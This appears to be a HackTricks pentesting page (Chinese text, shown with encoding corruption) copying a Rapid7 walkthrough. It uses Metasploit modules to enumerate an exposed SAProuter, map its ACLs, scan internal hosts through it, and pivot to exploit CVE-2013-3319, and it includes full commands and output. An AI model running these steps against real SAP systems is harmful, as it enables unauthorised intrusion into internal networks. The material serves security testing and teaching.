<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


Copy of: [https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/](https://blog.rapid7.com/2014/01/09/piercing-saprouter-with-metasploit/)
```text
PORT     STATE SERVICE    VERSION
3299/tcp open  saprouter?
```
# ä½¿ç”¨Metasploitç©¿é€SAProuter

SaprouteråŸºæœ¬ä¸Šæ˜¯SAPç³»ç»Ÿçš„åå‘ä»£ç†ï¼Œé€šå¸¸ä½äºäº’è”ç½‘å’Œå†…éƒ¨SAPç³»ç»Ÿä¹‹é—´ã€‚å®ƒçš„ä¸»è¦ç›®çš„æ˜¯å…è®¸æ¥è‡ªäº’è”ç½‘ä¸Šçš„ä¸»æœºå¯¹å†…éƒ¨SAPç³»ç»Ÿè¿›è¡Œå—æ§è®¿é—®ï¼Œå› ä¸ºå®ƒå¯ä»¥æ¯”å…¸å‹é˜²ç«å¢™æ›´ç²¾ç»†åœ°æ§åˆ¶SAPåè®®ã€‚

è¿™æ„å‘³ç€saprouteré€šå¸¸ä¼šæš´éœ²åœ¨äº’è”ç½‘ä¸Šï¼Œé€šè¿‡åœ¨ç»„ç»‡çš„é˜²ç«å¢™ä¸Šå…è®¸å¯¹saprouterä¸»æœºçš„å…¥ç«™TCPç«¯å£3299çš„è®¿é—®ã€‚ä»saprouterä¸Šï¼Œè‡³å°‘åº”è¯¥èƒ½å¤Ÿè®¿é—®åˆ°å†…éƒ¨çš„SAPæœåŠ¡å™¨ã€‚è¿™ä½¿å¾—å®ƒæˆä¸ºä¸€ä¸ªéå¸¸æœ‰è¶£çš„ç›®æ ‡ï¼Œå› ä¸ºå®ƒå¯ä»¥æä¾›è¿›å…¥â€œé«˜ä»·å€¼â€ç½‘ç»œçš„é€”å¾„ã€‚

ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªåŸºæœ¬çš„ç½‘ç»œè®¾ç½®ï¼Œæˆ‘ä»¬å°†åœ¨ç¤ºä¾‹ä¸­ä½¿ç”¨è¯¥è®¾ç½®ï¼š

![](https://blog.rapid7.com/content/images/post-images/33923/image1.jpg)

é¦–å…ˆï¼Œæˆ‘ä»¬å°†ä½¿ç”¨[`sap_service_discovery`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery)æ¨¡å—å¯¹æš´éœ²çš„IPåœ°å€è¿›è¡ŒSAPæœåŠ¡æ‰«æï¼Œæœ¬ä¾‹ä¸­ä¸º1.2.3.101ã€‚
```text
msf> use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_service_discovery) > run

[*] [SAP] Beginning service Discovery '1.2.3.101'

[+] 1.2.3.101:3299      - SAP Router OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
æ‰«æç»“æœæ˜¾ç¤ºä¸»æœºåœ¨é¢„æœŸçš„TCP 3299ç«¯å£ä¸Šè¿è¡Œç€SAPè·¯ç”±å™¨ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥æ·±å…¥æŒ–æ˜ï¼Œå¹¶å°è¯•ä»saprouterè·å–ä¸€äº›ä¿¡æ¯ã€‚å¦‚æœå®ƒè¢«é”™è¯¯é…ç½®äº†ï¼Œè€Œä¸”é€šå¸¸å®ƒä»¬éƒ½æ˜¯è¿™æ ·ï¼Œå¯èƒ½å¯ä»¥è·å–å†…éƒ¨ä¿¡æ¯ï¼Œä¾‹å¦‚é€šè¿‡saprouterä¸å†…éƒ¨ä¸»æœºå»ºç«‹çš„è¿æ¥ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨[`sap_router_info_request`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_info_request)æ¨¡å—ï¼š
```text
msf auxiliary(sap_router_info_request) > use auxiliary/scanner/sap/sap_router_info_request
msf auxiliary(sap_router_info_request) > set RHOSTS 1.2.3.101
RHOSTS => 1.2.3.101
msf auxiliary(sap_router_info_request) > run

[+] 1.2.3.101:3299 - Connected to saprouter
[+] 1.2.3.101:3299 - Sending ROUTER_ADM packet info request
[+] 1.2.3.101:3299 - Got INFO response
[+] Working directory   : /opt/sap
[+] Routtab             : ./saprouttab

[SAP] SAProuter Connection Table for 1.2.3.101
===================================================

Source        Destination   Service
------        -----------   -------
1.2.3.12      192.168.1.18  3200


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
æ‰€ä»¥ï¼Œä»è¾“å‡ºä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œäº’è”ç½‘ä¸Šçš„æŸä¸ªäººï¼ˆ1.2.3.12ï¼‰è¿æ¥åˆ°å†…éƒ¨ä¸»æœºï¼ˆ192.168.1.18ï¼‰çš„3200ç«¯å£ã€‚3200ç«¯å£æ˜¯DIAGåè®®çš„å¸¸è§SAPç«¯å£ï¼ˆSAP GUIåº”ç”¨ç¨‹åºè¿æ¥åˆ°SAPæœåŠ¡å™¨çš„åœ°æ–¹ï¼‰ã€‚æˆ‘ä»¬è¿˜è·å¾—äº†å…³äºå†…éƒ¨IPå¯»å€æ–¹æ¡ˆçš„ä¿¡æ¯ï¼Œä»–ä»¬å¾ˆå¯èƒ½ä½¿ç”¨çš„æ˜¯192.168.1.0/24ç½‘ç»œï¼Œæˆ–è€…è¯¥ç½‘ç»œä¸­çš„æŸä¸ªå­ç½‘ã€‚

**æšä¸¾å†…éƒ¨ä¸»æœºå’ŒæœåŠ¡**

æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥å¼€å§‹æ‰«æå†…éƒ¨ç½‘ç»œäº†ã€‚ç”±äºsaprouterçš„å·¥ä½œæ–¹å¼ç±»ä¼¼äºä»£ç†ï¼Œæˆ‘ä»¬å°†å°è¯•è¿æ¥åˆ°å®ƒå¹¶è¯·æ±‚è¿æ¥åˆ°å†…éƒ¨ä¸»æœºå’Œç«¯å£ï¼Œå¹¶æŸ¥çœ‹saprouterçš„å›å¤ã€‚è¿™å¯èƒ½ä¼šæ›´æ·±å…¥åœ°äº†è§£å†…éƒ¨ä¸»æœºã€æœåŠ¡å’ŒACLçš„æƒ…å†µï¼Œè¿™å–å†³äºsaprouterçš„é…ç½®ã€‚æˆ‘ä»¬å°†ä½¿ç”¨[`sap_router_portscanner`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_router_portscanner)æ¨¡å—æ¥å®ç°è¿™ä¸ªç›®çš„ã€‚

è¯¥æ¨¡å—è¿æ¥åˆ°saprouterå¹¶è¯·æ±‚è¿æ¥åˆ°å…¶ä»–ä¸»æœºï¼ˆåœ¨TARGETSé€‰é¡¹ä¸­å®šä¹‰ï¼‰çš„ç‰¹å®šTCPç«¯å£ã€‚ç„¶ååˆ†æå›å¤ï¼Œå¹¶åˆ¤æ–­æ‰€è¯·æ±‚çš„è¿æ¥æ˜¯å¦å¯èƒ½ã€‚è¯¥æ¨¡å—æä¾›äº†ä¸€äº›å¯ç”¨çš„é€‰é¡¹ï¼š
```text
Basic options:
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-99            no        SAP instance numbers to scan (NN in PORTS definition)
MODE         SAP_PROTO        yes       Connection Mode: SAP_PROTO or TCP  (accepted: SAP_PROTO, TCP)
PORTS        32NN             yes       Ports to scan (e.g. 3200-3299,5NN13)
RESOLVE      local            yes       Where to resolve TARGETS (accepted: remote, local)
RHOST                         yes       SAPRouter address
RPORT        3299             yes       SAPRouter TCP port
TARGETS                       yes       Comma delimited targets. When resolution is local address ranges or CIDR identifiers allowed.
```
è‡³å°‘ä½ éœ€è¦è®¾ç½®saprouterçš„IPåœ°å€ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯1.2.3.101ã€‚ç„¶åï¼Œå°†TARGETSè®¾ç½®ä¸ºæ‚¨æƒ³è¦æ‰«æçš„å†…éƒ¨ç½‘ç»œåœ°å€ï¼Œæœ€åä½¿ç”¨TCPç«¯å£è®¾ç½®PORTSã€‚

è¯¥æ¨¡å—è¿˜æä¾›äº†ä¸€ä¸ªINSTANCESé€‰é¡¹ï¼Œå¯ä»¥ç®€åŒ–PORTSé€‰é¡¹çš„å®šä¹‰ã€‚SAPå®‰è£…æ”¯æŒå¤šä¸ªå®ä¾‹ï¼Œæä¾›ç±»ä¼¼çš„æœåŠ¡ï¼Œå› æ­¤æ¯ä¸ªå®ä¾‹éƒ½åˆ†é…äº†TCPç«¯å£ã€‚ä¾‹å¦‚ï¼ŒSAPå®ä¾‹00å°†åœ¨ç«¯å£3200ä¸Šæä¾›SAPè°ƒåº¦æœåŠ¡ï¼ˆSAP GUIè¿æ¥åˆ°è¯¥æœåŠ¡ï¼‰ï¼Œå®ä¾‹01å°†åœ¨ç«¯å£3201ä¸Šæä¾›è¯¥æœåŠ¡ã€‚PORTSé€‰é¡¹æ”¯æŒä¸€ä¸ªâ€œé€šé…ç¬¦â€ï¼Œå³â€œNNâ€ï¼Œå®ƒå°†è¢«å®ä¾‹å·æ›¿æ¢ï¼Œå› æ­¤å¯ä»¥æ‰«ææ‰€æœ‰å®šä¹‰çš„å®ä¾‹çš„ç«¯å£ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ‰«æä»00åˆ°50çš„å®ä¾‹ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ–¹å¼å®šä¹‰INSTANCESå’ŒPORTSå˜é‡ï¼š
```text
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-50
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
```
ä½¿ç”¨æ­¤è®¾ç½®ï¼Œæ¨¡å—å°†æ‰«æ3200åˆ°3250èŒƒå›´å†…çš„ç«¯å£ã€‚

åœ¨æ¨¡å—çš„æºä»£ç ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³SAPç³»ç»Ÿå¸¸è§é»˜è®¤ç«¯å£çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨è¿™äº›ä¿¡æ¯è¿›è¡Œæ‰«æï¼š
```text
msf > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_router_portscanner
msf auxiliary(sap_router_portscanner) > set RHOST 1.2.3.101
RHOST => 1.2.3.101
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.18
TARGETS => 192.168.1.18
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > set PORTS 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
PORTS => 32NN,33NN,48NN,80NN,36NN,81NN,5NN00-5NN19,21212,21213,59975,59976,4238-4241,3299,3298,515,7200,7210,7269,7270,7575,39NN,3909,4NN00,8200,8210,8220,8230,4363,4444,4445,9999,3NN01-3NN08,3NN11,3NN17,20003-20007,31596,31597,31602,31601,31604,2000-2002,8355,8357,8351-8353,8366,1090,1095,20201,1099,1089,443NN,444NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host           Port   State   Info
----           ----   -----   ----
192.168.1.18   3201   closed  SAP Dispatcher sapdp01
192.168.1.18   3200   open    SAP Dispatcher sapdp00
192.168.1.18   50013  open    SAP StartService [SOAP] sapctrl00

[*] Auxiliary module execution completed
```
æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨VERBOSEé€‰é¡¹æ¥äº†è§£ä¸ºä»€ä¹ˆä¸€äº›è¿æ¥ä¸èƒ½é€šè¿‡saprouterã€‚å½“VERBOSEè®¾ç½®ä¸ºtrueæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°saprouterçš„å“åº”ï¼Œå¹¶æ˜ å°„å®šä¹‰çš„ACLã€‚

ç°åœ¨æˆ‘ä»¬å°†æ‰«æ192.168.1.18å’Œ192.168.1.1ä¸»æœºï¼Œä½†åªåœ¨ç«¯å£3200ä¸Šï¼Œä»¥æŸ¥çœ‹æ˜¯å¦å¯ä»¥è¿æ¥åˆ°ä¸¤ä¸ªSAPè°ƒåº¦ç¨‹åºï¼š
```text
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS 192.168.1.1,192.168.1.18
TARGETS => 192.168.1.1,192.168.1.18
msf auxiliary(sap_router_portscanner) > set PORTS 32NN
PORTS => 32NN
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State   Info
----          ----  -----   ----
192.168.1.18  3200  open  SAP Dispatcher sapdp00

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[!] Warning: Service info could be inaccurate
[*] Auxiliary module execution completed
```
æ­£å¦‚æ‚¨æ‰€è§ï¼Œæˆ‘ä»¬ç°åœ¨ä¹ŸçŸ¥é“æˆ‘ä»¬æ— æ³•è¿æ¥åˆ°ç«¯å£3200ä¸Šçš„å…¶ä»–ä¸»æœºï¼Œå› ä¸ºå®ƒè¢«saprouterä¸Šå®šä¹‰çš„ACLé˜»æ­¢äº†ã€‚

**æ˜ å°„ACL**

å…³äºsaprouterçš„ä¸€ä¸ªæœ‰è¶£ä¹‹å¤„æ˜¯ï¼Œå®ƒæ”¯æŒä¸¤ç§ç±»å‹çš„è¿æ¥ï¼š

* æœ¬æœºè¿æ¥ - è¿™äº›è¿æ¥åªæ˜¯TCPè¿æ¥ï¼›
* SAPåè®® - è¿™äº›æ˜¯å¸¦æœ‰å˜åŒ–çš„TCPè¿æ¥ï¼Œåè®®è§„å®šæ‰€æœ‰æ¶ˆæ¯éƒ½ä»¥4ä¸ªå­—èŠ‚çš„é•¿åº¦å¼€å§‹ï¼ŒæŒ‡ç¤ºæ¥ä¸‹æ¥çš„å†…å®¹çš„é•¿åº¦ã€‚

SAPåè®®æ˜¯ç‰¹å®šäºsaprouterçš„ï¼Œæ˜¯SAP GUIç”¨äºé€šè¿‡saprouterè¿æ¥åˆ°SAP DIAGç«¯å£çš„åè®®ã€‚æœ¬æœºåè®®ç”¨äºå…è®¸å…¶ä»–ç±»å‹çš„è¿æ¥é€šè¿‡saprouterã€‚

æ­¤æ¨¡å—å…è®¸åœ¨æ‰«æä¸­é€šè¿‡MODEé€‰é¡¹æŒ‡å®šè¦æµ‹è¯•çš„è¿æ¥ç±»å‹ã€‚é»˜è®¤å€¼æ˜¯SAPåè®®ï¼Œè¿™æ˜¯åœ¨ç”Ÿäº§ä¸­æœ€æœ‰å¯èƒ½ä½¿ç”¨çš„ã€‚ç„¶è€Œï¼Œå‘ç°å…è®¸é€šè¿‡saprouterçš„å…¶ä»–æœåŠ¡ä½¿ç”¨æœ¬æœºï¼ˆTCPï¼‰è¿æ¥çš„æƒ…å†µå¹¶ä¸ç½•è§ã€‚

æˆ‘ä»¬å¯ä»¥å°†MODEè®¾ç½®ä¸ºTCPï¼Œä»¥è¯„ä¼°æ˜¯å¦å…è®¸æ­¤ç±»è¿æ¥ã€‚æˆ‘ä»¬ç°åœ¨å°†æ‰«æå†…éƒ¨ä¸»æœºï¼Œåˆ†åˆ«åœ¨ç«¯å£3200ï¼ˆSAP DIAGï¼‰å’Œ80ï¼ˆHTTPï¼‰ä¸Šï¼Œå°†VERBOSEè®¾ç½®ä¸ºtrueï¼Œåœ¨å®ä¾‹00å’Œ01ä¸Šè§‚å¯Ÿç»“æœï¼š
```text
msf auxiliary(sap_router_portscanner) > set MODE TCP
MODE => TCP

msf auxiliary(sap_router_portscanner) > set PORTS 80,32NN
PORTS => 80,32NN
msf auxiliary(sap_router_portscanner) > set INSTANCES 00-01
INSTANCES => 00-01
msf auxiliary(sap_router_portscanner) > run

[*] Scanning 192.168.1.18
[+] 192.168.1.18:80 - TCP OPEN
[-] 192.168.1.18:3200 - blocked by ACL
[+] 192.168.1.18:3201 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host          Port  State  Info
----          ----  -----  ----
192.168.1.18  80    open
192.168.1.18  3201  open   SAP Dispatcher sapdp01

[*] Scanning 192.168.1.1
[-] 192.168.1.1:3200 - blocked by ACL
[+] 192.168.1.1:3201 - TCP OPEN
[+] 192.168.1.1:80 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host         Port  State  Info
----         ----  -----  ----
192.168.1.1  3201  open   SAP Dispatcher sapdp01
192.168.1.1  80    open

[*] Auxiliary module execution completed
```
ä»è¾“å‡ºå’Œä¹‹å‰çš„ä¿¡æ¯ä¸­ï¼Œæˆ‘ä»¬ç°åœ¨çŸ¥é“ACLçš„è®¾ç½®å¦‚ä¸‹ï¼š

* å…è®¸ä»ä»»ä½•ä¸»æœºçš„TCPè¿æ¥åˆ°192.168.1.1çš„80ç«¯å£
* å…è®¸ä»ä»»ä½•ä¸»æœºçš„TCPè¿æ¥åˆ°192.168.1.18çš„80ç«¯å£
* å…è®¸ä»ä»»ä½•ä¸»æœºçš„TCPè¿æ¥åˆ°192.168.1.1çš„3201ç«¯å£
* å…è®¸ä»ä»»ä½•ä¸»æœºçš„TCPè¿æ¥åˆ°192.168.1.18çš„3201ç«¯å£
* å…è®¸ä»ä»»ä½•ä¸»æœºçš„SAPè¿æ¥åˆ°192.168.1.18çš„3200ç«¯å£

**ç›²ç›®æšä¸¾å†…éƒ¨ä¸»æœº**

å¦‚æœä½ è¿˜è®°å¾—ï¼Œæˆ‘ä»¬å¼€å§‹æ—¶æ˜¯é€šè¿‡è·å–saprouterçš„ä¿¡æ¯æ¥çŸ¥é“å†…éƒ¨ä¸»æœºçš„IPåœ°å€ï¼Œç„¶åä»é‚£é‡Œç»§ç»­ã€‚ä½†æ˜¯å¦‚æœsaprouteræ²¡æœ‰æä¾›è¿™äº›ä¿¡æ¯æ€ä¹ˆåŠå‘¢ï¼Ÿ

ä¸€ç§é€‰æ‹©æ˜¯ç›´æ¥å¼€å§‹æ‰«æç§æœ‰åœ°å€ç©ºé—´ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚å¦ä¸€ç§é€‰æ‹©æ˜¯é€šè¿‡ä¸»æœºåç›²ç›®æšä¸¾ä¸»æœºã€‚

Saproutersèƒ½å¤Ÿè§£ææˆ‘ä»¬è¯·æ±‚è¿æ¥çš„ä¸»æœºåã€‚å½“saprouteræ— æ³•è¿æ¥æ—¶ï¼Œsaprouterä¼šå‹å¥½åœ°å‘Šè¯‰æˆ‘ä»¬é”™è¯¯ä¿¡æ¯ï¼ˆä½ å¯ä»¥é€šè¿‡å–æ¶ˆæ³¨é‡Šæ¨¡å—æºä»£ç çš„ç¬¬242è¡Œæ¥æŸ¥çœ‹åŸå§‹å“åº”ï¼‰ã€‚

æœ‰äº†è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸»æœºåæšä¸¾å†…éƒ¨ä¸»æœºï¼Œå¹¶å°è¯•ç›´æ¥è·å–ç›®æ ‡ï¼

ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å°†RESOLVEé€‰é¡¹è®¾ç½®ä¸ºâ€œremoteâ€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¨¡å—å°†è¯·æ±‚è¿æ¥åˆ°å®šä¹‰çš„ç›®æ ‡ï¼Œè€Œä¸ä¼šåœ¨æœ¬åœ°è§£æå®ƒä»¬ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•çŒœæµ‹å†…éƒ¨ä¸»æœºï¼Œå¹¶æœ€ç»ˆåœ¨ä¸çŸ¥é“å…¶IPåœ°å€çš„æƒ…å†µä¸‹è¿æ¥åˆ°å®ƒä»¬ã€‚

åœ¨ç›²ç›®æšä¸¾ä¸»æœºæ—¶éœ€è¦è®°ä½çš„é‡è¦äº‹é¡¹ï¼š

* å°†VERBOSEè®¾ç½®ä¸ºtrueï¼›
* å¦‚æœå°†MODEè®¾ç½®ä¸ºSAP_PROTOï¼Œæˆ‘ä»¬å°†ä»saprouterè·å–æ›´å¤šä¿¡æ¯ï¼›
* åªéœ€è®¾ç½®ä¸€ä¸ªç«¯å£è¿›è¡Œæ‰«æå³å¯ï¼Œå› ä¸ºæˆ‘ä»¬æ­¤æ—¶åªå¯¹saprouterå‘é€çš„ä¿¡æ¯æ„Ÿå…´è¶£ï¼ˆå°è¯•ä½¿ç”¨3200ï¼‰ï¼›
* ç»“æœå°†æ ¹æ®é…ç½®çš„ACLè€Œæœ‰æ‰€ä¸åŒã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¢«é˜»æ­¢çš„è¿æ¥ä¸ä¼šç»™æˆ‘ä»¬å¤ªå¤šä¿¡æ¯ã€‚

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†å°è¯•ä½¿ç”¨ä¸»æœºåsapã€sapsrvå’Œsapsrv2ã€‚
```text
msf auxiliary(sap_router_portscanner) > set RESOLVE remote
RESOLVE => remote
msf auxiliary(sap_router_portscanner) > set MODE SAP_PROTO
MODE => SAP_PROTO
msf auxiliary(sap_router_portscanner) > set VERBOSE true
VERBOSE => true
msf auxiliary(sap_router_portscanner) > set TARGETS sap,sapsrv,sapsrv2
TARGETS => sap,sapsrv,sapsrv2
msf auxiliary(sap_router_portscanner) > set PORTS 3200
PORTS => 3200
msf auxiliary(sap_router_portscanner) > run

[*] Scanning sap
[-] sap:3200 - unknown host
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv
[-] sapsrv:3200 - host unreachable
[!] Warning: Service info could be inaccurate
[*] Scanning sapsrv2
[+] sapsrv2:3200 - TCP OPEN
[!] Warning: Service info could be inaccurate

Portscan Results
================

Host     Port  State  Info
----     ----  -----  ----
sapsrv2  3200  open   SAP Dispatcher sapdp00

[*] Auxiliary module execution completed
```
ä»è¾“å‡ºä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸»æœºâ€œsapâ€ä¸å­˜åœ¨ï¼Œä½†æ˜¯ä¸»æœºsapsrvå­˜åœ¨ï¼Œå°½ç®¡æ— æ³•è®¿é—®ï¼Œè€Œsapsrv2å­˜åœ¨å¹¶ä¸”æˆ‘ä»¬å¯ä»¥è¿æ¥åˆ°ç«¯å£3200ã€‚

è¿™ç§æŠ€æœ¯ä¹Ÿå¯ä»¥ç”¨æ¥å°è¯•æŸ¥æ‰¾ç½‘ç»œä¸Šçš„å…¶ä»–ä¸»æœºï¼Œä¸SAPæ— å…³ï¼Œåªéœ€å°è¯•ä½¿ç”¨å¸¸è§çš„ä¸»æœºåï¼Œå¦‚smtpã€exchangeã€pdcã€bdcã€fileshareã€intranetï¼Œæˆ–è€…æ‚¨åœ¨æŠ€å·§åŒ…ä¸­è¿˜æœ‰å…¶ä»–å¥½çš„ä¸»æœºåã€‚

**æœ€åä¸€è‹±é‡Œ**

ç°åœ¨æˆ‘ä»¬å·²ç»è·å¾—äº†æ‰€æœ‰è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬çŸ¥é“äº†å¯ç”¨çš„å†…éƒ¨ä¸»æœºã€å…è®¸çš„æœåŠ¡ä»¥åŠæˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„åè®®æ¥ç©¿é€saprouterï¼Œæˆ‘ä»¬å®é™…ä¸Šå¯ä»¥è¿æ¥åˆ°å†…éƒ¨æœåŠ¡å™¨å¹¶ç»§ç»­è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚

Metasploitä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç§å¾ˆæ£’çš„æ–¹å¼æ¥ä½¿ç”¨saprouterä½œä¸ºä»£ç†ï¼Œä½¿ç”¨Proxiesé€‰é¡¹ï¼Œæ„Ÿè°¢Dave Hartleyï¼ˆ[@nmonkee](http://twitter.com/nmonkee)ï¼‰ã€‚

å› æ­¤ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘ä»¬æƒ³è¦å¼€å§‹æ”¶é›†æœ‰å…³æˆ‘ä»¬åœ¨ä¸»æœº192.168.1.18ä¸Šå‘ç°çš„å†…éƒ¨sapæœåŠ¡å™¨çš„ä¿¡æ¯ã€‚ä½œä¸ºç¤ºä¾‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æ¨¡å—[`sap_hostctrl_getcomputersystem`](http://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_hostctrl_getcomputersystem)ï¼Œè¯¥æ¨¡å—åˆ©ç”¨CVE-2013-3319ï¼Œå¹¶é€šè¿‡æœªç»èº«ä»½éªŒè¯çš„SOAPè¯·æ±‚æŸ¥è¯¢ç«¯å£1128ä¸Šçš„SAP Host ControlæœåŠ¡ï¼Œä»è€Œä¸ºæˆ‘ä»¬æä¾›æœ‰å…³æœåŠ¡å™¨æ­£åœ¨è¿è¡Œçš„æ“ä½œç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ã€‚æˆ‘ä»¬å°†é€šè¿‡saprouterè¿›è¡Œæ¢è½´è½¬å‘ï¼Œä½¿ç”¨metasploitä¸­çš„ä»£ç†æ”¯æŒï¼š

![](https://blog.rapid7.com/content/images/post-images/33923/image2.jpg)
```text
msf auxiliary(sap_router_portscanner) > use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
msf auxiliary(sap_hostctrl_getcomputersystem) > set Proxies sapni:1.2.3.101:3299
Proxies => sapni:1.2.3.101:3299
msf auxiliary(sap_hostctrl_getcomputersystem) > set RHOSTS 192.168.1.18
RHOSTS => 192.168.1.18
msf auxiliary(sap_hostctrl_getcomputersystem) > run

[+] 192.168.1.18:1128 - Information retrieved successfully
[*] 192.168.1.18:1128 - Response stored in /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_386124.xml (XML) and /Users/msfusr/.msf4/loot/20140107180827_default_192.168.1.18_sap.getcomputers_186948.txt (TXT)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œä½ å°†åœ¨lootä¸­è·å¾—æ¨¡å—çš„è‰¯å¥½è¾“å‡ºï¼Œå…¶ä¸­åŒ…å«æ¥è‡ªç›®æ ‡SAPä¸»æœºçš„æœ‰è¶£çš„å†…éƒ¨ä¿¡æ¯ï¼ˆä¾‹å¦‚å†…éƒ¨ç”¨æˆ·åï¼Œç„¶åå¯ä»¥å°è¯•æš´åŠ›ç ´è§£ï¼‰ã€‚

æ¢è½´æŠ€æœ¯å¯ä»¥ï¼ˆè€Œä¸”åº”è¯¥ï¼ï¼‰ç”¨äºå¯¹å†…éƒ¨ä¸»æœºè¿è¡Œå…¶ä»–æ¨¡å—ï¼Œä¸ä»…é™äºSAPç³»ç»Ÿï¼

**ç»“è®º**

